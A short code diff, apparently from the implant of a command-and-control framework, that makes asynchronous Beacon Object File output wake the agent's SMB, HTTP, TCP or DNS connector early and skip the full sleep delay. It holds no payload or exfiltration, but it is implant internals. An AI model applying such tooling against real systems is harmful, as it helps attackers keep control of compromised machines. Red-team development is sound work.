@@ -30,6 +30,14 @@ static void BofOutputToContext(AsyncBofContext* ctx, int type, PBYTE data, int d
     ctx->outputBuffer->Pack32(type);
     ctx->outputBuffer->PackBytes(data, dataSize);
     ApiWin->LeaveCriticalSection(&ctx->outputLock);
+
+    // Signal the main thread that output is available.
+    // This unblocks ConnectorSMB::Sleep (WaitForMultipleObjects) without
+    // requiring the 50ms polling loop, and also allows WaitMaskWithEvent
+    // (HTTP/TCP/DNS) to wake up before the full sleep_delay expires when
+    // the BOF produces intermediate output.
+    if (g_AsyncBofManager)
+        g_AsyncBofManager->SignalWakeup();
 }
 
 void BofOutputToTask(int type, PBYTE data, int dataSize)
